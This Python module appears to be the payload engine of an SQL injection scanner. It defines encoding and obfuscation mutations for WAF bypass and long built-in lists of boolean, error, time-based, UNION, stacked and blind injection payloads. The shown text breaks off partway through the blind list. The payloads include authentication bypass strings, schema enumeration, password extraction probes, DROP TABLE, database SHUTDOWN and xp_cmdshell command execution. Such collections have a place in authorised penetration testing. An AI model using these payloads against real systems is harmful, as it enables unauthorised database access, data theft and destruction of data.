"""
Payload Engine Module
====================

Provides structured payload categories and mutation capabilities:
- Boolean-based payloads
- Error-based payloads
- Time-based inference payloads
- UNION-based detection payloads

With encoding and obfuscation options:
- URL encoding
- Double encoding
- Case randomization
- Inline comments obfuscation
"""

from typing import List, Dict, Any, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum
import random
import urllib.parse


class PayloadType(Enum):
    """Categories of SQL injection payloads."""
    BOOLEAN_BASED = "boolean"
    ERROR_BASED = "error"
    TIME_BASED = "time"
    UNION_BASED = "union"
    STACKED_QUERY = "stacked"
    BLIND = "blind"
    GRAPHQL = "graphql"
    JSON = "json"
    NOSQL = "nosql"


class EncodingType(Enum):
    """Encoding types for payload mutation."""
    NONE = "none"
    URL_ENCODE = "url"
    DOUBLE_URL_ENCODE = "double_url"
    BASE64 = "base64"
    HEX = "hex"
    HTML = "html"
    Unicode = "unicode"


@dataclass
class Payload:
    """Represents a SQL injection payload."""
    value: str
    payload_type: PayloadType
    category: str
    description: str
    expected_behavior: str
    risk_level: str = "medium"
    database_target: Optional[str] = None
    
    def encode(self, encoding: EncodingType) -> str:
        """Encode the payload using specified encoding."""
        encoders = {
            EncodingType.NONE: lambda x: x,
            EncodingType.URL_ENCODE: urllib.parse.quote,
            EncodingType.DOUBLE_URL_ENCODE: lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            EncodingType.BASE64: lambda x: __import__('base64').b64encode(x.encode()).decode(),
            EncodingType.HEX: lambda x: ''.join(f'{ord(c):02x}' for c in x),
            EncodingType.HTML: lambda x: x.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;'),
            EncodingType.Unicode: lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
        }
        return encoders.get(encoding, lambda x: x)(self.value)
    
    def mutate(self, mutation_type: str) -> str:
        """Apply mutation to the payload."""
        mutations = {
            'case_random': lambda p: ''.join(
                c.upper() if random.random() > 0.5 else c.lower() for c in p
            ),
            'inline_comment': self._add_inline_comments,
            'whitespace_variation': self._vary_whitespace,
            'character_encoding': self._encode_characters,
        }
        return mutations.get(mutation_type, lambda x: x)(self.value)
    
    def _add_inline_comments(self, payload: str) -> str:
        """Add inline SQL comments for obfuscation."""
        keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'INSERT', 'UPDATE', 'DELETE']
        result = payload
        for keyword in keywords:
            if keyword in result.upper():
                insert_pos = result.upper().find(keyword) + len(keyword) // 2
                result = result[:insert_pos] + '/**/' + result[insert_pos:]
        return result
    
    def _vary_whitespace(self, payload: str) -> str:
        """Vary whitespace characters."""
        whitespace = [' ', '\t', '\n', '/**/', '/*comment*/']
        result = []
        for char in payload:
            if char.isspace():
                result.append(random.choice(whitespace))
            else:
                result.append(char)
        return ''.join(result)
    
    def _encode_characters(self, payload: str) -> str:
        """Encode special characters."""
        replacements = {
            "'": "''",
            '"': '""',
            '-': '+-',
            '=': '+=',
        }
        result = payload
        for old, new in replacements.items():
            result = result.replace(old, new)
        return result


class PayloadSet:
    """A set of related payloads."""
    
    def __init__(self, name: str, payloads: List[Payload]):
        self.name = name
        self.payloads = payloads
    
    def __iter__(self):
        return iter(self.payloads)
    
    def __len__(self):
        return len(self.payloads)


class PayloadEngine:
    """Engine for generating and mutating SQL injection payloads."""
    
    def __init__(self, max_payloads: int = 100):
        self.max_payloads = max_payloads
        self._payloads: Dict[PayloadType, List[Payload]] = {}
        self._custom_payloads: List[Payload] = []
        self._init_builtin_payloads()
    
    def _init_builtin_payloads(self) -> None:
        """Initialize built-in payloads for each type."""
        self._payloads = {
            PayloadType.BOOLEAN_BASED: self._get_boolean_payloads(),
            PayloadType.ERROR_BASED: self._get_error_payloads(),
            PayloadType.TIME_BASED: self._get_time_payloads(),
            PayloadType.UNION_BASED: self._get_union_payloads(),
            PayloadType.STACKED_QUERY: self._get_stacked_payloads(),
            PayloadType.BLIND: self._get_blind_payloads(),
            PayloadType.GRAPHQL: self._get_graphql_payloads(),
            PayloadType.JSON: self._get_json_payloads(),
            PayloadType.NOSQL: self._get_nosql_payloads(),
        }
    
    def _get_boolean_payloads(self) -> List[Payload]:
        """Get comprehensive boolean-based injection payloads."""
        payloads = [
            # Classic boolean-based (HIGH)
            Payload(value="' OR '1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_true", description="Basic boolean true", expected_behavior="Response differs when true", risk_level="high"),
            Payload(value="' OR '1'='2", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_false", description="Basic boolean false", expected_behavior="Response differs when false", risk_level="high"),
            Payload(value=" OR 1=1", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_noquote", description="Boolean without quotes", expected_behavior="Response changes", risk_level="high"),
            Payload(value="' OR 1=1--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_or_comment", description="OR with comment", expected_behavior="Response differs", risk_level="high"),
            Payload(value="1' OR '1'='1' --", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_prefixed", description="Numeric prefix", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 'x'='x", payload_type=PayloadType.BOOLEAN_BASED, category="always_true_x", description="Always-true with x", expected_behavior="Response differs", risk_level="high"),
            Payload(value="'=", payload_type=PayloadType.BOOLEAN_BASED, category="equal_condition", description="Equal condition", expected_behavior="Response changes", risk_level="high"),
            Payload(value="1 OR 1=1", payload_type=PayloadType.BOOLEAN_BASED, category="numeric_or", description="Numeric OR", expected_behavior="Response differs", risk_level="high"),
            Payload(value="1' OR '1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="quoted_or", description="Quoted OR", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 1=1 #", payload_type=PayloadType.BOOLEAN_BASED, category="mysql_comment", description="MySQL inline comment", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 1=1--", payload_type=PayloadType.BOOLEAN_BASED, category="dash_comment", description="Dash comment", expected_behavior="Response differs", risk_level="high"),
            Payload(value="admin' OR '1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="admin_bypass", description="Admin bypass", expected_behavior="Auth bypass", risk_level="high"),
            Payload(value="%27+OR+1%3D1", payload_type=PayloadType.BOOLEAN_BASED, category="url_encoded", description="URL encoded OR", expected_behavior="Response differs", risk_level="high"),
            Payload(value="%20OR%201%3D1", payload_type=PayloadType.BOOLEAN_BASED, category="url_encoded2", description="URL encoded", expected_behavior="Response differs", risk_level="high"),
            Payload(value="'/**/OR/**/1=1--", payload_type=PayloadType.BOOLEAN_BASED, category="waf_inline_comment", description="Inline comment WAF bypass", expected_behavior="Bypass WAF", risk_level="high"),
            Payload(value="' OR 1=1 --%09", payload_type=PayloadType.BOOLEAN_BASED, category="waf_tab", description="Tab bypass", expected_behavior="Bypass WAF", risk_level="high"),
            Payload(value="' OR 1=1 --%0a", payload_type=PayloadType.BOOLEAN_BASED, category="waf_newline", description="Newline bypass", expected_behavior="Bypass WAF", risk_level="high"),
            Payload(value="' OR 1=1-- -", payload_type=PayloadType.BOOLEAN_BASED, category="waf_trailing", description="Trailing space", expected_behavior="Bypass WAF", risk_level="high"),
            Payload(value="1' ORDER BY 1--", payload_type=PayloadType.BOOLEAN_BASED, category="orderby", description="ORDER BY test", expected_behavior="Error or different", risk_level="high"),
            Payload(value="' OR ''='", payload_type=PayloadType.BOOLEAN_BASED, category="always_true", description="Always true", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="1' AND '1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="and_true", description="AND true", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="' OR 1=1%00", payload_type=PayloadType.BOOLEAN_BASED, category="null_byte", description="Null byte", expected_behavior="Bypass filter", risk_level="medium"),
            Payload(value="1 OR 1=1", payload_type=PayloadType.BOOLEAN_BASED, category="simple_or", description="Simple OR", expected_behavior="Response differs", risk_level="low"),
            # Additional boolean payloads (NEW)
            Payload(value="1=1", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_eq", description="Simple equals", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 1=1;", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_semicolon", description="OR with semicolon", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 'a'='a", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_a", description="Always true a", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 1--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_short", description="Short OR", expected_behavior="Response differs", risk_level="high"),
            Payload(value="a' OR 'a'='a", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_a2", description="Alpha OR", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 2>1--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_gt", description="Greater than", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 1<2--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_lt", description="Less than", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 1=1 #", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_hash", description="Hash comment", expected_behavior="Response differs", risk_level="high"),
            Payload(value="') OR ('1'='1", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_parens", description="Double parens", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR '1'='1' --", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_dash", description="Dash comment", expected_behavior="Response differs", risk_level="high"),
            Payload(value="1' OR '1'='1' #", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_hash2", description="Hash comment", expected_behavior="Response differs", risk_level="high"),
            Payload(value="' OR 1=1--%23", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_url_hash", description="URL hash", expected_behavior="Bypass filter", risk_level="medium"),
            Payload(value="1--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_num_comment", description="Numeric comment", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="a'--", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_alpha_comment", description="Alpha comment", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="' OR 1=1--/*", payload_type=PayloadType.BOOLEAN_BASED, category="boolean_block_start", description="Block start", expected_behavior="Bypass WAF", risk_level="medium"),
        ]
        return payloads
    
    def _get_error_payloads(self) -> List[Payload]:
        """Get comprehensive error-based injection payloads."""
        payloads = [
            Payload(value="'", payload_type=PayloadType.ERROR_BASED, category="single_quote", description="Single quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value="''", payload_type=PayloadType.ERROR_BASED, category="double_quote", description="Double quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value="' OR 1=1 --", payload_type=PayloadType.ERROR_BASED, category="or_error", description="OR with comment", expected_behavior="Error or diff", risk_level="high"),
            Payload(value="')", payload_type=PayloadType.ERROR_BASED, category="parenthesis_close", description="Closing paren", expected_behavior="SQL error", risk_level="high"),
            Payload(value="))", payload_type=PayloadType.ERROR_BASED, category="double_paren", description="Double paren", expected_behavior="SQL error", risk_level="high"),
            Payload(value="CONCAT(", payload_type=PayloadType.ERROR_BASED, category="unclosed_function", description="Unclosed function", expected_behavior="SQL error", risk_level="high"),
            Payload(value="1'", payload_type=PayloadType.ERROR_BASED, category="number_quote", description="Number quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value="1--", payload_type=PayloadType.ERROR_BASED, category="number_comment", description="Number comment", expected_behavior="SQL error", risk_level="high"),
            Payload(value=";", payload_type=PayloadType.ERROR_BASED, category="semicolon", description="Semicolon", expected_behavior="SQL error", risk_level="high"),
            Payload(value="' UNION SELECT NULL--", payload_type=PayloadType.ERROR_BASED, category="union_null", description="UNION NULL", expected_behavior="Error or diff", risk_level="high"),
            Payload(value="' UNION SELECT NULL,NULL--", payload_type=PayloadType.ERROR_BASED, category="union_two_null", description="UNION 2 NULL", expected_behavior="Error or diff", risk_level="high"),
            Payload(value="1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", payload_type=PayloadType.ERROR_BASED, category="extractvalue", description="ExtractValue", expected_behavior="MySQL error", risk_level="high"),
            Payload(value="' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", payload_type=PayloadType.ERROR_BASED, category="updatexml", description="UpdateXML", expected_behavior="MySQL error", risk_level="high"),
            Payload(value="%27", payload_type=PayloadType.ERROR_BASED, category="url_encoded", description="URL encoded", expected_behavior="SQL error", risk_level="medium"),
            Payload(value="\\", payload_type=PayloadType.ERROR_BASED, category="backslash", description="Backslash", expected_behavior="Error", risk_level="medium"),
            Payload(value="BENCHMARK(1000000,SHA1('test'))", payload_type=PayloadType.ERROR_BASED, category="benchmark", description="BENCHMARK", expected_behavior="Delay", risk_level="medium"),
            Payload(value="NULL", payload_type=PayloadType.ERROR_BASED, category="null", description="NULL", expected_behavior="Different response", risk_level="low"),
            # Additional error payloads (NEW)
            Payload(value="\"", payload_type=PayloadType.ERROR_BASED, category="double_quote", description="Double quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value="\"\"", payload_type=PayloadType.ERROR_BASED, category="double_dquote", description="Double double quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value=")))", payload_type=PayloadType.ERROR_BASED, category="triple_paren", description="Triple paren", expected_behavior="SQL error", risk_level="high"),
            Payload(value='1"', payload_type=PayloadType.ERROR_BASED, category="num_dquote", description="Num double quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value='" OR "1"="1', payload_type=PayloadType.ERROR_BASED, category="dquote_or", description="Double quote OR", expected_behavior="SQL error", risk_level="high"),
            Payload(value="'", payload_type=PayloadType.ERROR_BASED, category="unicode_quote", description="Unicode quote", expected_behavior="SQL error", risk_level="high"),
            Payload(value=";", payload_type=PayloadType.ERROR_BASED, category="semicolon2", description="Semicolon", expected_behavior="SQL error", risk_level="high"),
            Payload(value="--", payload_type=PayloadType.ERROR_BASED, category="double_dash", description="Double dash", expected_behavior="SQL error", risk_level="high"),
            Payload(value="/*", payload_type=PayloadType.ERROR_BASED, category="block_start", description="Block comment start", expected_behavior="SQL error", risk_level="high"),
            Payload(value="@@version", payload_type=PayloadType.ERROR_BASED, category="mssql_version", description="MSSQL version", expected_behavior="Different response", risk_level="high"),
            Payload(value="CHAR(39)", payload_type=PayloadType.ERROR_BASED, category="char_function", description="CHAR function", expected_behavior="SQL error", risk_level="medium"),
            Payload(value="0x27", payload_type=PayloadType.ERROR_BASED, category="hex_quote", description="Hex quote", expected_behavior="SQL error", risk_level="medium"),
            Payload(value="',", payload_type=PayloadType.ERROR_BASED, category="quote_comma", description="Quote comma", expected_behavior="SQL error", risk_level="high"),
            Payload(value="')/", payload_type=PayloadType.ERROR_BASED, category="quote_slash", description="Quote slash", expected_behavior="SQL error", risk_level="high"),
        ]
        return payloads
    
    def _get_time_payloads(self) -> List[Payload]:
        """Get comprehensive time-based (blind) injection payloads."""
        payloads = [
            Payload(value="' AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep", description="MySQL SLEEP", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1 AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep_num", description="MySQL SLEEP numeric", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1' AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep_quoted", description="MySQL SLEEP quoted", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="' AND BENCHMARK(5000000,MD5('test'))--", payload_type=PayloadType.TIME_BASED, category="mysql_benchmark", description="MySQL BENCHMARK", database_target="mysql", expected_behavior="Response delayed", risk_level="high"),
            Payload(value="1' AND pg_sleep(5)--", payload_type=PayloadType.TIME_BASED, category="postgres_sleep", description="PostgreSQL SLEEP", database_target="postgresql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1 AND pg_sleep(5)--", payload_type=PayloadType.TIME_BASED, category="postgres_sleep_num", description="PostgreSQL SLEEP numeric", database_target="postgresql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="'; WAITFOR DELAY '0:0:5'--", payload_type=PayloadType.TIME_BASED, category="mssql_waitfor", description="MSSQL WAITFOR", database_target="mssql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1'; WAITFOR DELAY '0:0:5'--", payload_type=PayloadType.TIME_BASED, category="mssql_waitfor_quoted", description="MSSQL WAITFOR quoted", database_target="mssql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="'; DBMS_LOCK.SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="oracle_sleep", description="Oracle SLEEP", database_target="oracle", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="' AND SLEEP(2)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep_short", description="MySQL 2s delay", database_target="mysql", expected_behavior="Response delayed 2s", risk_level="medium"),
            Payload(value="1 AND SLEEP(2)--", payload_type=PayloadType.TIME_BASED, category="mysql_sleep_short2", description="MySQL 2s numeric", database_target="mysql", expected_behavior="Response delayed 2s", risk_level="medium"),
            Payload(value="'; WAITFOR DELAY '0:0:2'--", payload_type=PayloadType.TIME_BASED, category="mssql_short", description="MSSQL 2s delay", database_target="mssql", expected_behavior="Response delayed 2s", risk_level="medium"),
            Payload(value="' AND IF(1=1,SLEEP(5),0)--", payload_type=PayloadType.TIME_BASED, category="mysql_if", description="MySQL IF", database_target="mysql", expected_behavior="Conditional delay", risk_level="medium"),
            Payload(value="/*!50000SLEEP(5)*/", payload_type=PayloadType.TIME_BASED, category="mysql_version", description="Version comment SLEEP", database_target="mysql", expected_behavior="Response delayed", risk_level="low"),
            # Additional time payloads (NEW)
            Payload(value="' AND SLEEP(3)#", payload_type=PayloadType.TIME_BASED, category="mysql_hash", description="MySQL hash comment", database_target="mysql", expected_behavior="Response delayed 3s", risk_level="high"),
            Payload(value="1 AND SLEEP(3)--", payload_type=PayloadType.TIME_BASED, category="mysql_num_sleep", description="MySQL numeric SLEEP", database_target="mysql", expected_behavior="Response delayed 3s", risk_level="high"),
            Payload(value="') AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_paren", description="MySQL paren SLEEP", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1; SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--", payload_type=PayloadType.TIME_BASED, category="mysql_case", description="MySQL CASE", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1' AND SLEEP(5) AND '1'='1", payload_type=PayloadType.TIME_BASED, category="mysql_and", description="MySQL AND SLEEP", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1)) AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_dparen", description="MySQL double paren", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1' WAITFOR DELAY '00:00:05'--", payload_type=PayloadType.TIME_BASED, category="mssql_quote", description="MSSQL quote WAITFOR", database_target="mssql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1\" AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_dquote", description="MySQL double quote", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_count", description="MySQL COUNT delay", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
            Payload(value="1' AND ELT(1=1,SLEEP(5),0)--", payload_type=PayloadType.TIME_BASED, category="mysql_elt", description="MySQL ELT", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
        ]
        return payloads
    
    def _get_union_payloads(self) -> List[Payload]:
        """Get comprehensive UNION-based injection payloads."""
        payloads = [
            Payload(value="' UNION SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_null", description="UNION NULL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT NULL,NULL--", payload_type=PayloadType.UNION_BASED, category="union_two_null", description="UNION 2 NULL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT NULL,NULL,NULL--", payload_type=PayloadType.UNION_BASED, category="union_three_null", description="UNION 3 NULL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION ALL SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_all_null", description="UNION ALL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT 1--", payload_type=PayloadType.UNION_BASED, category="union_one", description="UNION 1", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT 1,2--", payload_type=PayloadType.UNION_BASED, category="union_two", description="UNION 1,2", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT version()--", payload_type=PayloadType.UNION_BASED, category="union_version", description="UNION version()", expected_behavior="Version info", risk_level="high"),
            Payload(value="' UNION SELECT user()--", payload_type=PayloadType.UNION_BASED, category="union_user", description="UNION user()", expected_behavior="User info", risk_level="high"),
            Payload(value="' UNION SELECT database()--", payload_type=PayloadType.UNION_BASED, category="union_db", description="UNION database()", expected_behavior="DB info", risk_level="high"),
            Payload(value="'/**/UNION/**/SELECT/**/NULL--", payload_type=PayloadType.UNION_BASED, category="union_bypass", description="Bypass comments", expected_behavior="Bypass WAF", risk_level="medium"),
            Payload(value="' UNION%20SELECT%20NULL--", payload_type=PayloadType.UNION_BASED, category="union_url", description="URL encoded", expected_behavior="Bypass filter", risk_level="medium"),
            Payload(value="1' ORDER BY 1--", payload_type=PayloadType.UNION_BASED, category="orderby1", description="ORDER BY 1", expected_behavior="Error or diff", risk_level="medium"),
            Payload(value="1' ORDER BY 2--", payload_type=PayloadType.UNION_BASED, category="orderby2", description="ORDER BY 2", expected_behavior="Error or diff", risk_level="medium"),
            Payload(value="1' ORDER BY 3--", payload_type=PayloadType.UNION_BASED, category="orderby3", description="ORDER BY 3", expected_behavior="Error or diff", risk_level="medium"),
            Payload(value="1' ORDER BY 4--", payload_type=PayloadType.UNION_BASED, category="orderby4", description="ORDER BY 4", expected_behavior="Error or diff", risk_level="medium"),
            Payload(value="1' ORDER BY 5--", payload_type=PayloadType.UNION_BASED, category="orderby5", description="ORDER BY 5", expected_behavior="Error or diff", risk_level="medium"),
            # Additional UNION payloads (NEW)
            Payload(value="' UNION ALL SELECT 1,2,3--", payload_type=PayloadType.UNION_BASED, category="union_123", description="UNION 1,2,3", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT @@version,user()--", payload_type=PayloadType.UNION_BASED, category="union_multi", description="UNION multi func", expected_behavior="Version info", risk_level="high"),
            Payload(value="' UNION SELECT table_name FROM information_schema.tables--", payload_type=PayloadType.UNION_BASED, category="union_tables", description="UNION tables", expected_behavior="Table names", risk_level="high"),
            Payload(value="' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", payload_type=PayloadType.UNION_BASED, category="union_columns", description="UNION columns", expected_behavior="Column names", risk_level="high"),
            Payload(value="' UNION SELECT NULL,NULL,NULL,NULL--", payload_type=PayloadType.UNION_BASED, category="union_4null", description="UNION 4 NULL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT 1,2,3,4,5--", payload_type=PayloadType.UNION_BASED, category="union_5", description="UNION 1-5", expected_behavior="Different response", risk_level="high"),
            Payload(value="1' UNION ALL SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_all_num", description="UNION ALL numeric", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION DISTINCT SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_distinct", description="UNION DISTINCT", expected_behavior="Different response", risk_level="medium"),
            Payload(value="' UNION SELECT 0x696e666f--", payload_type=PayloadType.UNION_BASED, category="union_hex", description="UNION hex", expected_behavior="Different response", risk_level="high"),
            Payload(value="') UNION SELECT NULL--", payload_type=PayloadType.UNION_BASED, category="union_paren", description="UNION with paren", expected_behavior="Different response", risk_level="high"),
            Payload(value="1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", payload_type=PayloadType.UNION_BASED, category="union_6null", description="UNION 6 NULL", expected_behavior="Different response", risk_level="high"),
            Payload(value="' UNION SELECT char(65)--", payload_type=PayloadType.UNION_BASED, category="union_char", description="UNION CHAR", expected_behavior="Different response", risk_level="medium"),
            Payload(value="' LIMIT 1 OFFSET 0--", payload_type=PayloadType.UNION_BASED, category="union_limit", description="LIMIT OFFSET", expected_behavior="Different response", risk_level="medium"),
            Payload(value="' UNION ALL SELECT NULL--%23", payload_type=PayloadType.UNION_BASED, category="union_hash", description="UNION hash", expected_behavior="Bypass WAF", risk_level="medium"),
            Payload(value="1) ORDER BY 1--", payload_type=PayloadType.UNION_BASED, category="orderby_paren", description="ORDER BY paren", expected_behavior="Error or diff", risk_level="medium"),
        ]
        return payloads
    
    def _get_stacked_payloads(self) -> List[Payload]:
        """Get stacked query payloads."""
        payloads = [
            Payload(value="'; DROP TABLE users--", payload_type=PayloadType.STACKED_QUERY, category="stacked_drop", description="Stacked query with DROP", expected_behavior="Error if stacked queries supported", risk_level="high"),
            Payload(value="'; SELECT 1--", payload_type=PayloadType.STACKED_QUERY, category="stacked_select", description="Stacked query with SELECT", expected_behavior="Different response", risk_level="medium"),
            # Additional stacked payloads (NEW)
            Payload(value="'; INSERT INTO users (id) VALUES (1)--", payload_type=PayloadType.STACKED_QUERY, category="stacked_insert", description="Stacked INSERT", expected_behavior="Error or success", risk_level="high"),
            Payload(value="'; UPDATE users SET id=1--", payload_type=PayloadType.STACKED_QUERY, category="stacked_update", description="Stacked UPDATE", expected_behavior="Different response", risk_level="high"),
            Payload(value="'; ALTER TABLE users ADD col1 INT--", payload_type=PayloadType.STACKED_QUERY, category="stacked_alter", description="Stacked ALTER", expected_behavior="Different response", risk_level="high"),
            Payload(value="'; EXEC xp_cmdshell('dir')--", payload_type=PayloadType.STACKED_QUERY, category="stacked_xp", description="MSSQL xp_cmdshell", expected_behavior="Command execution", risk_level="high"),
            Payload(value="1; DROP TABLE users--", payload_type=PayloadType.STACKED_QUERY, category="stacked_num", description="Numeric stacked", expected_behavior="Error if stacked", risk_level="high"),
            Payload(value="'); DROP TABLE users--", payload_type=PayloadType.STACKED_QUERY, category="stacked_paren", description="Paren stacked", expected_behavior="Error if stacked", risk_level="high"),
            Payload(value="1'; EXEC sp_executesql N'select 1--", payload_type=PayloadType.STACKED_QUERY, category="stacked_sp", description="MSSQL sp_executesql", expected_behavior="Different response", risk_level="high"),
            Payload(value="'; WAITFOR DELAY '00:00:05'--", payload_type=PayloadType.STACKED_QUERY, category="stacked_wait", description="Stacked WAITFOR", expected_behavior="Response delayed", risk_level="high"),
            Payload(value="1) OR 1=1--", payload_type=PayloadType.STACKED_QUERY, category="stacked_or", description="Stacked OR", expected_behavior="Different response", risk_level="medium"),
            Payload(value="'; CREATE TABLE test(id INT)--", payload_type=PayloadType.STACKED_QUERY, category="stacked_create", description="Stacked CREATE", expected_behavior="Different response", risk_level="high"),
            Payload(value="1'; SHUTDOWN WITH NOWAIT--", payload_type=PayloadType.STACKED_QUERY, category="stacked_shutdown", description="MSSQL SHUTDOWN", expected_behavior="DB shutdown", risk_level="critical"),
        ]
        return payloads
    
    def _get_blind_payloads(self) -> List[Payload]:
        """Get blind SQL injection payloads."""
        payloads = [
            Payload(value="' AND (SELECT COUNT(*) FROM users) > 0--", payload_type=PayloadType.BLIND, category="blind_count", description="Blind COUNT", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--", payload_type=PayloadType.BLIND, category="blind_substring", description="Blind SUBSTRING", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="1 AND (SELECT SLEEP(3))", payload_type=PayloadType.BLIND, category="blind_sleep", description="Blind SLEEP", expected_behavior="Response delayed", risk_level="medium"),
            # Additional blind payloads (NEW)
            Payload(value="1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64--", payload_type=PayloadType.BLIND, category="blind_ascii", description="Blind ASCII", expected_behavior="Response based on ASCII", risk_level="high"),
            Payload(value="' AND (SELECT LENGTH(database())) > 0--", payload_type=PayloadType.BLIND, category="blind_length", description="Blind LENGTH", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="1' AND EXISTS(SELECT * FROM users)--", payload_type=PayloadType.BLIND, category="blind_exists", description="Blind EXISTS", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="1 AND (SELECT 1 FROM users LIMIT 1)=1", payload_type=PayloadType.BLIND, category="blind_select1", description="Blind SELECT 1", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="' AND 1=1 AND ''='", payload_type=PayloadType.BLIND, category="blind_double", description="Blind double true", expected_behavior="Response differs", risk_level="medium"),
            Payload(value="1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--", payload_type=PayloadType.BLIND, category="blind_schema", description="Blind schema count", expected_behavior="Response differs", risk_level="high"),
            Payload(value="1 AND (SELECT SLEEP(0) FROM users)=0", payload_type=PayloadType.BLIND, category="blind_sleep0", description="Blind SLEEP 0", expected_behavior="Response differs", risk_level="low"),
            Payload(value="1' AND 1=CONVERT(int,(SELECT top 1 table_name FROM information_schema.tables))--", payload_type=PayloadType.BLIND, category="blind_convert", description="Blind CONVERT", expected_behavior="Error or diff", risk_level="high"),
            Payload(value="1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NOT NULL--", payload_type=PayloadType.BLIND, category="blind_oracle", description="Oracle pipe", expected_behavior="Response delayed", risk_level="high"),
            Payload(value="1' AND (SELECT COUNT(*) FROM dual) > 0--", payload_type=PayloadType.BLIND, category="blind_dual", description="Oracle dual", expected_behavior="Response differs", risk_level="medium"),
